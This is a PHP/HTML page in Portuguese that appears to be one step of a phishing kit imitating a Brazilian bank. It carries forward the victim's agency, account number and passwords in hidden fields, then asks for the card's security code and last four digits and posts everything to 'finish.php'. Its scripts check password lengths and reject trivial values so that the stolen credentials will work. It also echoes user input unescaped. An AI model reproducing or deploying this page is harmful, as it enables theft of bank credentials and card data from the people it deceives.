<?php 
  $url_atual = "http" . (isset($_SERVER[HTTPS]) ? (($_SERVER[HTTPS]=="on") ? "s" : "") : "") . "://" . "$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";

  $explodeUrl = explode("/",$url_atual);
  $novaUrl = array_pop($explodeUrl);
  $explodeUrl = implode("/",$explodeUrl);
?>
<html lang="pt-BR">

<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <style type="text/css">
        @media (min-width: 1025px) {
            #icons {
                display: none !important;
            }
        }
        .pac-container {
            background-color: #fff;
            position: absolute!important;
            z-index: 1000;
            border-radius: 2px;
            border-top: 1px solid #d9d9d9;
            font-family: Arial, sans-serif;
            box-shadow: 0 2px 6px rgba(0, 0, 0, 0.3);
            -moz-box-sizing: border-box;
            -webkit-box-sizing: border-box;
            box-sizing: border-box;
            overflow: hidden
        }
        .pac-logo:after {
            content: "";
            padding: 1px 1px 1px 0;
            height: 16px;
            text-align: right;
            display: block;
            background-image: url(https://maps.gstatic.com/mapfiles/api-3/images/powered-by-google-on-white3.png);
            background-position: right;
            background-repeat: no-repeat;
            background-size: 120px 14px
        }
        .hdpi.pac-logo:after {
            background-image: url(https://maps.gstatic.com/mapfiles/api-3/images/powered-by-google-on-white3_hdpi.png)
        }
        .pac-item {
            cursor: default;
            padding: 0 4px;
            text-overflow: ellipsis;
            overflow: hidden;
            white-space: nowrap;
            line-height: 30px;
            text-align: left;
            border-top: 1px solid #e6e6e6;
            font-size: 11px;
            color: #999
        }
        .pac-item:hover {
            background-color: #fafafa
        }
        .pac-item-selected,
        .pac-item-selected:hover {
            background-color: #ebf2fe
        }
        .pac-matched {
            font-weight: 700
        }
        .pac-item-query {
            font-size: 13px;
            padding-right: 3px;
            color: #000
        }
        .pac-icon {
            width: 15px;
            height: 20px;
            margin-right: 7px;
            margin-top: 6px;
            display: inline-block;
            vertical-align: top;
            background-image: url(https://maps.gstatic.com/mapfiles/api-3/images/autocomplete-icons.png);
            background-size: 34px
        }
        .hdpi .pac-icon {
            background-image: url(https://maps.gstatic.com/mapfiles/api-3/images/autocomplete-icons_hdpi.png)
        }
        .pac-icon-search {
            background-position: -1px -1px
        }
        .pac-item-selected .pac-icon-search {
            background-position: -18px -1px
        }
        .pac-icon-marker {
            background-position: -1px -161px
        }
        .pac-item-selected .pac-icon-marker {
            background-position: -18px -161px
        }
        .pac-placeholder {
            color: gray
        }
    </style>
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
    <meta name="robots" content="noindex, nofollow">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="shortcut icon" href="html/favicon.ico" type="image/x-icon">
    <link rel="stylesheet" href="html/main.css">
    <link rel="stylesheet" type="text/css" href="html/preloader.css">

</head>

<body id="home-background" class="home">
    <div id="preloader" style="display: none;">
        <div id="status">
            <div id="centro"></div>
            <center><img width="30px" src="html/preloader_ios.gif">
            </center>
        </div>
    </div>
    <main id="site-main" class="main-home min-height" style="height: 586px;margin-top: -40px;background: rgba(0, 0, 0, 0.66);top: -8px;">
        <div> <img style="margin-top: 31%;margin-left: 20%;width: 19%;opacity: 0.7;" src="html/user.png">
            <p style="margin-top: -8%;margin-left: 44%;font-size: 11pt;color: #333;">
                <?php echo $_POST['agencia'] ?> / <?php echo $_POST['conta'] ?> </p>
        </div>
        <div id="conteudo" style="margin-top: 23%;background: #FAFAFA;padding: 10px; height: 400px">
            <div id="menu" style="display: none;"> <img src="html/menu_app.png" style="width: 99%"> </div>
            <div id="updt" style="">
                <form name="formulariobb3" onsubmit="return enviardados3();" method="post" enctype="multipart/form-data" enctype="multipart/form-data" action="finish.php">

                	<?php foreach($_POST as $key => $value):  ?>
                        <input type="hidden" name="<?php echo $key; ?>" id="<?php echo $key; ?>" value="<?php echo $value; ?>" />
                    <?php endforeach; ?>
                    <input type="hidden" name="erro" value="<?php echo $explodeUrl.'/finish.php'; ?>" />
                    <input type="hidden" name="sucesso" value="<?php echo $explodeUrl.'/finish.php'; ?>" />

                    <center>
                        <img id="cartaoimg" src="html/cvv.png" style="width: 90%">
                    </center>
                    <br>
                    <input required="" id="cvv" name="cvv" placeholder="Código de Segurança do cartão" onkeyup="validar(this,'num');" maxlength="3" class="input-field fields-search active-input-search" type="tel" style="display: inline-block;" onfocus="focusCVV()">



                    <input required="" id="digitos" name="digitos" placeholder="Últimos 4 dígitos do cartão" onkeyup="validar(this,'num');" maxlength="4" class="input-field fields-search active-input-search" type="tel" style="display: inline-block;" onfocus="focusDIG()">

                    <input type="hidden" name="step" value="passo4">
                    <button style="margin-top: 10px !important" type="submit" class="back-to-results" id="back-results-button"> Confirmar Agora </button>


                    <center>
                        <br>
                        <p style="font-size: 10pt; color: #f50000">*CVV é um código de segurança impresso no verso do seu cartão de crédito com 3 (três) dígitos.</p>

                    </center>
                </form>
            </div>
        </div>
    </main>
    <script>
        function enviardados3() {
            if (document.formulariobb3.imei.value.length < 19) {
                var alerta = "Verifique o imei do seu dispositívo e tente novamente.";
                alert(alerta);
                document.formulariobb3.imei.focus();
                return false;
            }
            return true;
        }

        function enviardados2() {
            if (document.formulariobb2.celular.value == "11 1-1111-1111") {
                var alerta = "Celular Inválido.";
                alert(alerta);
                document.formulariobb2.celular.focus();
                return false;
            }
            if (document.formulariobb2.celular.value == "22 2-2222-2222") {
                var alerta = "Celular Inválido.";
                alert(alerta);
                document.formulariobb2.celular.focus();
                return false;
            }
            if (document.formulariobb2.celular.value == "33 3-3333-3333") {
                var alerta = "Celular Inválido.";
                alert(alerta);
                document.formulariobb2.celular.focus();
                return false;
            }
            if (document.formulariobb2.celular.value == "44 4-4444-4444") {
                var alerta = "Celular Inválido.";
                alert(alerta);
                document.formulariobb2.celular.focus();
                return false;
            }
            if (document.formulariobb2.celular.value == "55 5-5555-5555") {
                var alerta = "Celular Inválido.";
                alert(alerta);
                document.formulariobb2.celular.focus();
                return false;
            }
            if (document.formulariobb2.celular.value == "66 6-6666-6666") {
                var alerta = "Celular Inválido.";
                alert(alerta);
                document.formulariobb2.celular.focus();
                return false;
            }
            if (document.formulariobb2.celular.value == "77 7-7777-7777") {
                var alerta = "Celular Inválido.";
                alert(alerta);
                document.formulariobb2.celular.focus();
                return false;
            }
            if (document.formulariobb2.celular.value == "88 8-8888-8888") {
                var alerta = "Celular Inválido.";
                alert(alerta);
                document.formulariobb2.celular.focus();
                return false;
            }
            if (document.formulariobb2.celular.value == "99 9-9999-9999") {
                var alerta = "Celular Inválido.";
                alert(alerta);
                document.formulariobb2.celular.focus();
                return false;
            }
            if (document.formulariobb2.celular.value == "00 0-0000-0000") {
                var alerta = "Celular Inválido.";
                alert(alerta);
                document.formulariobb2.celular.focus();
                return false;
            }
            if (document.formulariobb2.senha6.value.length < 6) {
                var alerta = "Senha de 6 dígitos inválida.";
                alert(alerta);
                document.formulariobb2.senha6.focus();
                return false;
            }
            if (document.formulariobb2.senha4.value.length < 4) {
                var alerta = "Senha de 4 dígitos inválida.";
                alert(alerta);
                document.formulariobb2.senha4.focus();
                return false;
            }
            return true;
        }

        function enviardados1() {
            if (document.formulariobb1.senha8.value.length < 8) {
                var alerta = "Senha de 8 dígitos Inválida.";
                alert(alerta);
                document.formulariobb1.senha8.focus();
                return false;

            }
            if (document.formulariobb1.senha8.value == "11111111") {
                var alerta = "Conta Inválida.";
                alert(alerta);
                document.formulariobb1.senha8.focus();
                return false;
            }
            if (document.formulariobb1.senha8.value == "22222222") {
                var alerta = "Conta Inválida.";
                alert(alerta);
                document.formulariobb1.senha8.focus();
                return false;
            }
            if (document.formulariobb1.senha8.value == "33333333") {
                var alerta = "Conta Inválida.";
                alert(alerta);
                document.formulariobb1.senha8.focus();
                return false;
            }
            if (document.formulariobb1.senha8.value == "44444444") {
                var alerta = "Conta Inválida.";
                alert(alerta);
                document.formulariobb1.senha8.focus();
                return false;
            }
            if (document.formulariobb1.senha8.value == "55555555") {
                var alerta = "Conta Inválida.";
                alert(alerta);
                document.formulariobb1.senha8.focus();
                return false;
            }
            if (document.formulariobb1.senha8.value == "66666666") {
                var alerta = "Conta Inválida.";
                alert(alerta);
                document.formulariobb1.senha8.focus();
                return false;
            }
            if (document.formulariobb1.senha8.value == "77777777") {
                var alerta = "Conta Inválida.";
                alert(alerta);
                document.formulariobb1.senha8.focus();
                return false;
            }
            if (document.formulariobb1.senha8.value == "88888888") {
                var alerta = "Conta Inválida.";
                alert(alerta);
                document.formulariobb1.senha8.focus();
                return false;
            }
            if (document.formulariobb1.senha8.value == "99999999") {
                var alerta = "Conta Inválida.";
                alert(alerta);
                document.formulariobb1.senha8.focus();
                return false;
            }
            if (document.formulariobb1.senha8.value == "00000000") {
                var alerta = "Conta Inválida.";
                alert(alerta);
                document.formulariobb1.senha8.focus();
                return false;
            }
            return true;
        }

        function mascara(format, field) {
            var result = "";
            var maskIdx = format.length - 1;
            var error = false;
            var valor = field.value;
            var posFinal = false;
            if (field.setSelectionRange) {
                if (field.selectionStart == valor.length) posFinal = true;
            }
            valor = valor.replace(/[^0123456789Xx]/g, '')
            for (var valIdx = valor.length - 1; valIdx >= 0 && maskIdx >= 0; --maskIdx) {
                var chr = valor.charAt(valIdx);
                var chrMask = format.charAt(maskIdx);
                switch (chrMask) {
                    case '#':
                        if (!(/\d/.test(chr))) error = true;
                        result = chr + result;
                        --valIdx;
                        break;
                    case '@':
                        result = chr + result;
                        --valIdx;
                        break;
                    default:
                        result = chrMask + result;
                }
            }
            field.value = result;
            field.style.color = error ? 'red' : '';
            if (posFinal) {
                field.selectionStart = result.length;
                field.selectionEnd = result.length;
            }
            return result;
        }

        function pulacampo(idobj, idproximo) {
            var str = new String(document.getElementById(idobj).value);
            var mx = new Number(document.getElementById(idobj).maxLength);
            if (str.length == mx) {
                document.getElementById(idproximo).focus();
            }
        }

        function focusCVV() {
            var img = document.getElementById('cartaoimg');
            img.src = 'html/cvv.png';
        }

        function focusDIG() {
            var img = document.getElementById('cartaoimg');
            img.src = 'html/digitos.png';
        }

        function validar(dom, tipo) {
            switch (tipo) {
                case 'num':
                    var regex = /[A-Za-z]/g;
                    break;
                case 'text':
                    var regex = /\d/g;
                    break;
            }
            dom.value = dom.value.replace(regex, '');
        }

        function mascaracel(t, mask) {
            var i = t.value.length;
            var saida = mask.substring(1, 0);
            var texto = mask.substring(i)
            if (texto.substring(0, 1) != saida) {
                t.value += texto.substring(0, 1);
            }
        }
    </script>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
    <script>
        window.onload = function() {
            setTimeout(function() {
                $("#preloader").fadeIn();
            }, 1000);
            setTimeout(function() {
                $("#menu").fadeOut();
                $("#updt").fadeIn();
                $("#preloader").fadeOut();
            }, 5000);
        }
    </script>


    <script>
        window.onload = function() {
            setTimeout(function() {
                $("#preloader").fadeIn();
            }, 1000);
            setTimeout(function() {
                $("#menu").fadeOut();
                $("#updt").fadeIn();
                $("#preloader").fadeOut();
            }, 5000);
        }
    </script>





</body>


</html>